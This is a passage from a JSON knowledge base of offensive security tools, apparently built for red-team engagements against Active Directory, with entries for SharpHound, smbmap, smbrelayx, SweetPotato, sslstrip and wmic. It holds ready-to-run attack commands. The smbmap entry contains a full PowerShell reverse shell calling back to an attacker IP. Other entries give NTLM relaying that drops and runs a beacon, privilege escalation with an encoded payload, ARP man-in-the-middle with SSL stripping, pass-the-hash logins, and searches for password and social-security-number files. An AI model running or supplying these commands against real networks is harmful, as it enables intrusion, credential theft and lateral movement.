    "content": "# SharpHound\n\n## [[Domain]]\nAll information\n> SharpHound.exe -c All --randomfilenames --memcache -d <domain> --throttle 10000 --jitter 10 --zippassword \"RT2022!\" --ldapusername <user> --ldappassword \"<pw>\" --domaincontroller <ip> --excludedcs\n\n#opsec: use --stealth, but that removes:\n* LoggedOn\n* DCOM\n* RPD\n* PSRemote\n* LocalAdmin\n\nAdditionally to snapshot\n> SharpHound.exe -c \"Container, LocalGroup, GPOLocalGroup, Session, LoggedOn, RDP, DCOM\" --randomfilenames --memcache -d <domain> --throttle 10000 --jitter 10 --stealth --zippassword \"RT2022!\" --ldapusername <user> --ldappassword \"<pw>\" --domaincontroller <ip>\n\n## [[Domain Controller]]\nGet DC via Trust\n>SharpHound -c DcOnly -d evil.external\n\n\n## [[One-Way (Inbound)]]\nGet Trust of domain\n>SharpHound -c Trusts -d evil.external\n\n\n",
    "commands": [],
    "latest_commit": "2023-05-09T13:59:59Z"
  },
  {
    "name": "SharpSystemTriggers",
    "phases": [
      "07. Lateral Movement",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/cube0x0/SharpSystemTriggers",
    "description": "Collection of remote authentication triggers in C#",
    "undetected": [],
    "detected": [],
    "content": "## [[NTLM Relaying to ADCS]]\nMethods available:\n| Method | Description | Img |\n| ------ | ----------- | --- |\n|SharpEfsTrigger| MS-EFS RPC| ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/efs.png) |\n|SharpSpoolTrigger| MS-RPRN RPC | ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/spool.png) |\n|SharpDcomTrigger| DCOM Potato | ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/dcom.png) |\n\n\n\n",
    "commands": [],
    "latest_commit": "2022-10-02T14:34:48Z"
  },
  {
    "name": "SharpView",
    "phases": [
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/tevora-threat/SharpView",
    "description": "PowerView is the original of SharpView and has most of those queries also implemented",
    "undetected": [],
    "detected": [],
    "content": "# SharpView\n\n\n## [[Domain]]  \nSee [[PowerView]]\n> execute-assembly C:\\Tools\\SharpView\\SharpView\\bin\\Debug\\SharpView.exe Get-Domain\n\n\n",
    "commands": [],
    "latest_commit": "2021-12-17T15:53:20Z"
  },
  {
    "name": "smbclient",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
    "description": "smbclient \u2014 ftp-like client to access SMB/CIFS resources on servers",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Guest Access (SMB)]] [[Shares]]\n* 'smbclient -U '%' -L //<dc-ip>'\n* 'smbclient -U 'guest%' -L //<dc-ip>'\n\n",
    "commands": [
      {
        "id": "5f637b32-3a34-4429-86df-09d45c63d569",
        "name": "SMB anonymous login",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbclient -U '%' -L //<ip>",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "9981168c-2f85-4dcd-b14e-20f06ed84414",
        "name": "SMB guest login",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbclient -U 'guest%' -L //<ip>",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      }
    ]
  },
  {
    "name": "smbmap",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/ShawnDEvans/smbmap",
    "description": "SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Guest Access (SMB)]]\n* `smbmap -u \"\" -p \"\" -P 445 -H <dc-ip>`\n* `smbmap -u \"guest\" -p \"\" -P 445 -H <dc-ip>`\n\n\n",
    "commands": [
      {
        "id": "f6451a5f-08ea-4bc7-a018-f9bc38fbf921",
        "name": "SMB anonymous login",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbmap -u \"\" -p \"\" -P 445 -H <ip>",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "7305314c-e31c-42f1-af86-c4d13e06c0e8",
        "name": "SMB guest login",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbmap -u \"guest\" -p \"\" -P 445 -H <ip>",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "338a4da8-b77c-4e08-ba5b-e11383d25df7",
        "name": "Help",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Main arguments:\n  -H HOST               IP of host\n  --host-file FILE      File containing a list of hosts\n  -u USERNAME           Username, if omitted null session assumed\n  -p PASSWORD           Password or NTLM hash\n  --prompt              Prompt for a password\n  -s SHARE              Specify a share (default C$), ex 'C$'\n  -d DOMAIN             Domain name (default WORKGROUP)\n  -P PORT               SMB port (default 445)\n  -v                    Return the OS version of the remote host\n  --admin               Just report if the user is an admin\n  --no-banner           Removes the banner from the top of the output\n  --no-color            Removes color from output\n  --no-update           Removes \"Working on it...\" update message from output\n\nCommand Execution:\n  Options for executing commands on the specified host\n\n  -x COMMAND            Execute a command ex. 'ipconfig /all'\n  --mode CMDMODE        Set the execution method, wmi or psexec, default wmi\n\nShard drive Search:\n  Options for searching/enumerating the share of the specified host(s)\n\n  -L                    List all drives on the specified host, requires ADMIN\n                        rights.\n  -R [PATH]             Recursively list dirs, and files (no share\\path lists\n                        ALL shares), ex. 'C$\\Finance'\n  -r [PATH]             List contents of directory, default is to list root of\n                        all shares, ex. -r 'C$\\Documents and\n                        Settings\\Administrator\\Documents'\n  -A PATTERN            Define a file name pattern (regex) that auto downloads\n                        a file on a match (requires -R or -r), not case\n                        sensitive, ex '(web|global).(asax|config)'\n  -g FILE               Output to a file in a grep friendly format, used with\n                        -r or -R (otherwise it outputs nothing), ex -g\n                        grep_out.txt\n  --csv FILE            Output to a CSV file, ex --csv shares.csv\n  --dir-only            List only directories, ommit files.\n  --no-write-check      Skip check to see if drive grants WRITE access.\n  -q                    Quiet verbose output. Only shows shares you have READ\n                        or WRITE on, and suppresses file listing when\n                        performing a search (-A).\n  --depth DEPTH         Traverse a directory tree to a specific depth. Default\n                        is 5.\n  --exclude SHARE [SHARE ...]\n                        Exclude share(s) from searching and listing, ex.\n                        --exclude ADMIN$ C$'\n\nFile Content Search:\n  Options for searching the content of files (must run as root), kind of experimental\n\n  -F PATTERN            File content search, -F '[Pp]assword' (requires admin\n                        access to execute commands, and PowerShell on victim\n                        host)\n  --search-path PATH    Specify drive/path to search (used with -F, default\n                        C:\\Users), ex 'D:\\HR\\'\n  --search-timeout TIMEOUT\n                        Specifcy a timeout (in seconds) before the file search\n                        job gets killed. Default is 300 seconds.\n\nFilesystem interaction:\n  Options for interacting with the specified host's filesystem\n\n  --download PATH       Download a file from the remote system,\n                        ex.'C$\\temp\\passwords.txt'\n  --upload SRC DST      Upload a file to the remote system ex.\n                        '/tmp/payload.exe C$\\temp\\payload.exe'\n  --delete PATH TO FILE\n                        Delete a remote file, ex. 'C$\\temp\\msf.exe'\n  --skip                Skip delete file confirmation prompt",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "d8562afa-f263-41df-a14d-c5c2658c8aff",
        "name": "SMB login with hash",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "3333793b-2086-4f3b-abc1-6f1d82c71dee",
        "name": "SMB command exec",
        "description": "",
        "tag": "",
        "results": [
          "EXECUTION:REMOTE"
        ],
        "cmd": "smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group \"Domain Admins\" /domain' -H 192.168.2.50",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "dc866f27-609b-47cc-8ea8-9642e71a0f25",
        "name": "SMB login",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbmap.py -H 192.168.12.123 -u administrator -p asdf1234",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "f1218659-f058-4d69-8c44-23a6248fad82",
        "name": "Non recursive path listing (ls)",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\\Users'",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "b4c2ff7c-d57a-4e5b-bea5-bbd17cc18e17",
        "name": "File Content Search",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "6ebdf996-1109-46b2-a4b2-5f50523d2242",
        "name": "Get drives",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:DRIVES"
        ],
        "cmd": "smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      },
      {
        "id": "349d8da8-632a-4060-bb81-2814f0c3db0b",
        "name": "Get Shell (PS)",
        "description": "Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)",
        "tag": "",
        "results": [
          "EXECUTION:REMOTE"
        ],
        "cmd": "python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command \"function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=\"\"\"\"192.168.0.153\"\"\"\"; $port=\"\"\"\"4445\"\"\"\";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=\"\"\"\"cmd.exe\"\"\"\"  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=\"\"\"\" \"\"\"\"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};\"'",
        "requirements": {
          "tag": "SERVICE:SMB"
        }
      }
    ],
    "latest_commit": "2023-03-29T13:36:32Z"
  },
  {
    "name": "smbrelayx",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py",
    "description": "Relax SMB requests to target",
    "undetected": [],
    "detected": [],
    "content": "# smbrelayx\n\n## [[NTLM Relaying]]\n1. Install\n    ```bash\n    pip3 install impacket\n    git clone https://github.com/SecureAuthCorp/impacket\n    ```\n2. Drop and execute beacon on device\n    ```bash\n    cd impacket\n    sudo python3 examples/smbrelayx.py -h 192.168.1.118 -e ~/smbexp.exe\n    ```\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T15:04:47Z"
  },
  {
    "name": "smbserver",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n## [[SQL NetNTLM Capture]]\nYou may also use the WinDivert + rportfwd combo (shown on the [[NTLM Relaying#Windows - Cobalt Strike]]) with Impacket's `smbserver.py` to capture the NetNTLM hashes.\n```sh\npython3 /usr/local/bin/smbserver.py -smb2support pwn .\n\nImpacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (127.0.0.1,46894)\n[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'\n[*] AUTHENTICATE_MESSAGE (EDU\\svc_mssql,SRV1)\n[*] User SRV1\\svc_mssql authenticated successfully\n[*] svc_mssql::EDU:[...snip...]\n[*] Connecting Share(1:pwn)\n```\n\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T15:04:47Z"
  },
  {
    "name": "snmpwalk",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux",
      "Windows"
    ],
    "source": "https://linux.die.net/man/1/snmpwalk",
    "description": "snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.",
    "undetected": [],
    "detected": [],
    "content": "# snmpwalk\n\n## [[Vulnerable Machines]]\n\nUses snmp-getnext requests to enumerate a network device for their tree information. An object identified (OID) can be provided and from there all information below will be queried. If no OID is being provided, snmpwalk will start at the subtree rooted at SNMPv2-SMI::mib-2.\n\n![](/Images/Tools/d2e354a3-b1dc-40fa-bb6f-323dea9713de.png)\n\nIf the OID is being displayed as follows\n\n![](/Images/Tools/549ed8bc-0f8d-4d5a-89b0-df8cbff60ca3.png)\n\nensure to install the _snmp-mibs-downloader_ and commend the 4th line in /etc/snmp/snmp.conf.\n\nExample to query installed programs:\n\n![](/Images/Tools/0de1da34-6198-4529-90d3-40d89d6bccbd.png)\n\nsnmpset - modify\n----------------\n\nSNMPset is using the _set_ request to set or change information on the network entity. It allows managing the device.\n\nThe minimum requirement for this tool is a valid _OID_, a _type_ (integer, string), and a _value_. The following command changed the _sysContact_ key.\n\n![](/Images/Tools/31682251-2c70-48eb-9587-abadd7f63da0.png)\n![](/Images/Tools/8af26abc-4c3d-4ee2-9349-0895906829d6.png)\n\nAll available types are listed below:\n\n![](/Images/Tools/a9790eba-1da7-4a28-b942-3083cc4e36d7.png)\n\nYou can find NMAP scripts for SNMP as follows:\n\n```bash\nls /usr/share/nmap/scripts | grep -i snmp\n```\n\nThe above-mentioned process enumeration can also be done with the following NMAP script\n\n```java\nsudo nmap -sU -p 161 --scripts=snmp-win32-services 192.168.1.1\n```\n\nCommunity string bruteforce\n\n```bash\nsudo apt install seclists\nsudo nmap -sU -p 161 --scripts=snmp-brute --script-args=snmp.brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt 192.168.1.1\n```\n\n\n",
    "commands": []
  },
  {
    "name": "socat",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux",
      "Windows"
    ],
    "source": "http://www.dest-unreach.org/socat/",
    "description": "socat is a relay for bidirectional data transfer between two independent data channels. Each of these data channels may be a file, pipe, device (serial line etc. or a pseudo terminal), a socket (UNIX, IP4, IP6 - raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin etc.), the GNU line editor (readline), a program, or a combination of two of these. \nThese modes include generation of \"listening\" sockets, named pipes, and pseudo terminals.",
    "undetected": [],
    "detected": [],
    "content": "## Redirect TCP traffic\n'''\nsocat TCP4-LISTEN:80,fork TCP4:<REMOTE>:80\n'''\n\n\n",
    "commands": [
      {
        "id": "2eb8949c-105e-424b-aa63-e93072a9d653",
        "name": "Forward TCP4 traffic",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "socat TCP4-LISTEN:80,fork TCP4:<REMOTE>:80"
      }
    ]
  },
  {
    "name": "Spiderfoot",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/smicallef/spiderfoot",
    "description": "SpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Passive Reconnaissance]]\n\n",
    "commands": [],
    "latest_commit": "2023-05-03T09:44:55Z"
  },
  {
    "name": "spoofcheck",
    "phases": [
      "01. Initial Access",
      "08. Credentials & User Impersonation"
    ],
    "category": "OSINT",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/BishopFox/spoofcheck",
    "description": "Simple script that checks a domain for email protections",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Internal Phishing]][[Phishing]]\nSimple script that checks a domain for email protections.\n\n",
    "commands": [
      {
        "id": "b0c14789-9e82-4c39-9975-da3eafe934ca",
        "name": "Check SPF and DMARC records",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "./spoofcheck.py [DOMAIN]"
      },
      {
        "id": "5e49afdc-8e7d-4ffe-b112-584176053a63",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "git clone https://github.com/BishopFox/spoofcheck.git\npip install -r requirements.txt"
      }
    ],
    "latest_commit": "2021-05-03T19:33:01Z"
  },
  {
    "name": "SpoolSample",
    "phases": [
      "05. Privilege Escalation",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/leechristensen/SpoolSample",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Vulnerabilities/Printer Bug]] [[Kerberos/Printer Bug]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\SpoolSample\\SpoolSample\\bin\\Debug\\SpoolSample.exe dc-2 srv1\n\n[+] Converted DLL to shellcode\n[+] Executing RDI\n[+] Calling exported function\n``````\n\n\n",
    "commands": [],
    "latest_commit": "2018-10-05T22:36:05Z"
  },
  {
    "name": "TREVORspray",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/blacklanternsecurity/TREVORspray",
    "description": "TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! Multiple modules: msol (Office 365), adfs (Active Directory Federation Services), owa (Outlook Web App), okta (Okta SSO), anyconnect (Cisco VPN)",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [],
    "latest_commit": "2023-01-23T21:30:40Z"
  },
  {
    "name": "ssh",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux",
      "Windows"
    ],
    "source": "n/a",
    "description": "SSH or Secure Shell is a network communication protocol that enables two computers to communicate (c.f http or hypertext transfer protocol, which is the protocol used to transfer hypertext such as web pages) and share data.",
    "undetected": [],
    "detected": [],
    "content": "# SSH\n\n## Pivoting\n\n### Portforwarding\nConnect to root@remote with the certificate foo.pem\nRedirect local port 80 on the target to attacker machine 81\n-f: will background the SSH connection\n-N do not execute a command\n'''\nssh -i foo.pem root@<REMOTE> -R 81:localhost:80 -f -N\n'''\n\n",
    "commands": [
      {
        "id": "dcf7b938-00ef-4494-a659-876b100e9b25",
        "name": "Portforwarding",
        "description": "Redirect local port 80 on the target to attacker machine 81\n-f: will background the SSH connection\n-N do not execute a command",
        "tag": "",
        "results": [],
        "cmd": "ssh -i foo.pem root@<REMOTE> -R 81:localhost:80 -f -N"
      }
    ]
  },
  {
    "name": "sslstrip",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/moxie0/sslstrip",
    "description": "sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.",
    "undetected": [],
    "detected": [],
    "content": "# sslstrip\n\nAlthough most of the users will confirm the certificate exception, enhancements in SSL attack tools have found ways to exploit SSL without the need to inject a self-signed cert. The default port is 10000 and MITM needs to be done before starting the tool.  \nBlackHat 2009 Moxie Marlinspike introduced a new method for extracting information from a secure session by attacking HTTP. In order to demonstrate how this works, Marlinspike released a tool named sslstrip.\n\n## [[08.Credentials & User Impersonation/MITM]]\n![](/Images/Tools/4618cef1-9c6f-41a2-b7ba-bd5e41ff22ad.png)\n\nThere are some issues that present themselves in this type of attack for example:\n\n*   Some content-encoding, such as gzip, is difficult to parse.\n*   Cookies that are sent over HTTPS will not be sent over HTTP that has striped the SSL.\n*   Any cached pages which did not have the links swapped out\n\nIn order to counter these shortcomings, sslstrip actually Strips parts of the requests for this information:\n\n*   Stopping the secure bit on the _Set-Cookie_ statements on the pages\n*   Strip the difficult encodings from the client requests\n*   Strip the _if-modified-since_ headers to eliminate the cached pages being requested\n\nHow to proceed:\n\n1.  Enable IP forwarding\n2.  Setup port redirection using iptables\n3.  Start sslstrip on port 8080, -w save logs into file, -f replace favicon\n4.  Start ARP MitM between victim and gateway\n    ```java\n    echo 1 > /proc/sys/net/ipv4/ip_forward\n    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080\n    sslstrip -a -f -l 8080 -w els-sslt\n    ```\n\n\n",
    "commands": [],
    "latest_commit": "2021-05-29T01:53:12Z"
  },
  {
    "name": "sublist3r",
    "phases": [
      "02. Reconnaissance",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/aboul3la/Sublist3r",
    "description": "Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[IPs/Domains]]\n\n",
    "commands": [],
    "latest_commit": "2023-02-06T06:40:16Z"
  },
  {
    "name": "SweetPotato",
    "phases": [
      "05. Privilege Escalation",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/CCob/SweetPotato",
    "description": "Force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.",
    "undetected": [],
    "detected": [],
    "content": "# SweetPotato\n\n## [[Vulnerabilities/Printer Bug]] [[Kerberos/Printer Bug]] [[SQL Privilege Escalation]]\n```beacon\nbeacon> execute-assembly C:\\Tools\\SweetPotato\\bin\\Debug\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc SQBFAF[...snip...]ApAA==\"\n\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n[+] Attempting NP impersonation using method PrintSpoofer to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering notification on evil PIPE \\\\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\nbeacon> connect localhost 4444\n[*] Tasked to connect to localhost:4444\n[+] host called home, sent: 20 bytes\n[+] established link to child beacon: 10.10.18.221\n```\n\n",
    "commands": [],
    "latest_commit": "2023-04-20T16:24:22Z"
  },
  {
    "name": "theHarvester",
    "phases": [
      "02. Reconnaissance",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/laramies/theHarvester",
    "description": "theHarvester is a very simple to use, yet powerful and effective tool designed to be used in the early stages of a penetration test or red team engagement. Use it for open source intelligence (OSINT) gathering to help determine a company's external threat landscape on the internet. The tool gathers emails, names, subdomains, IPs and URLs using multiple public data sources",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Contact details]] [[IPs/Domains]] [[IP Ranges]]\n\n",
    "commands": [],
    "latest_commit": "2023-05-12T23:05:33Z"
  },
  {
    "name": "ThreadCheck",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/rasta-mouse/ThreatCheck",
    "description": "Identifies the bytes that Microsoft Defender / AMSI Consumer flags on.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[AMSI]]\n### Example\n> C:\\Users\\Rasta>ThreatCheck.exe -f Downloads\\Grunt.bin -e AMSI\n\n### Commands\n```cmd\nC:\\>ThreatCheck.exe --help\n  -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI\n  -f, --file      Analyze a file on disk\n  -u, --url       Analyze a file from a URL\n  --help          Display this help screen.\n  --version       Display version information.\n```\n\n\n",
    "commands": [],
    "latest_commit": "2023-04-04T03:06:16Z"
  },
  {
    "name": "tpotce",
    "phases": [],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/telekom-security/tpotce",
    "description": "\ud83c\udf6f T-Pot - The All In One Honeypot platforms \ud83d\udc1d",
    "undetected": [],
    "detected": [],
    "content": "\n\n",
    "commands": [],
    "latest_commit": "2023-05-12T16:37:04Z"
  },
  {
    "name": "trufflehog",
    "phases": [],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/trufflesecurity/trufflehog",
    "description": "\ud83c\udf6f T-Pot - The All In One Honeypot platforms \ud83d\udc1d",
    "undetected": [],
    "detected": [],
    "content": "## [Credentials]\n\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T19:58:38Z"
  },
  {
    "name": "VBad",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows",
      "Linux"
    ],
    "source": "https://github.com/Pepitoh/Vbad",
    "description": "VBA Obfuscation Tools combined with an MS office document generator",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Macros]]\n\n",
    "commands": [],
    "latest_commit": "2017-10-15T12:56:18Z"
  },
  {
    "name": "wmic",
    "phases": [
      "03. Host Enumeration",
      "05. Privilege Escalation",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n# Commands\n```cmd\nREM List all alias\n    wmic alias list brief\nREM Information about the OS\n    wmic computersystem list full\nREM Available volumes\n    wmic volume list brief\n```\n\nDomain Controller\nEntry: Technique\nTool: Header\n-> \n\nEntry: Technique\nTool: Tag\n\n## [[Domain]]\n```cmd\nDomain DC and Information\nwmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles\n\nList all users\nwmic /NAMESPACE:\\\\root\\directory ldap PATH ds_user GET ds_samaccountname\n\nGet all groups\nwmic /NAMESPACE:\\\\root\\directory ldap PATH ds_group GET ds_samaccountname\n\nMembers of Domain Admins Group\nwmic path win32_groupuser where (groupcomponent=\"win32_group.name='domain admins',domain =='YOURDOMAINHERE'\")\n\nList all computers\nwmic /NAMESPACE: root directory ldap PATH ds_computer GET\nds_samaccountname\n```\n\n## [[Local User+Groups]]\nGet local user accounts\n```cmd\nwmic useraccount list\n```\n\n## [[Windows Update]]\nList Updates\n```cmd\nwmic qfe list brief\n```\n\n## [[AV-EDR]]\nList Antivirus\n```cmd\nwmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe\n```\n\n## [[Sensitive Files]]\nSearch files containing 'password' in the name\n```cmd\nwmic DATAFILE where \"drive='C:' AND Name like '%password%'\" GET Name,readable,size /VALUE\n```\n\n## [[Unquoted Service Path]]\nList of every service and the path\n```cmd\nwmic service get name, pathname\nName                                      PathName\nALG                                       C:\\Windows\\System32\\alg.exe\nAppVClient                                C:\\Windows\\system32\\AppVClient.exe\nAmazonSSMAgent                            \"C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe\"\n[...snip...]\nVuln-Service-1                            C:\\Program Files\\Vuln Services\\Service 1.exe\n```\n\n\n",
    "commands": []
  },
  {
    "name": "WMIexec",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py",
    "description": "A similar approach to smbexec but executing commands through WMI. Main advantage here is it runs under the user (has to be Admin) account, not SYSTEM, plus, it doesn't generate noisy messages in the event log that smbexec.py does when creating a service. Drawback is it needs DCOM, hence, I have to be able to access DCOM ports at the target machine.",
    "undetected": [],
    "detected": [],
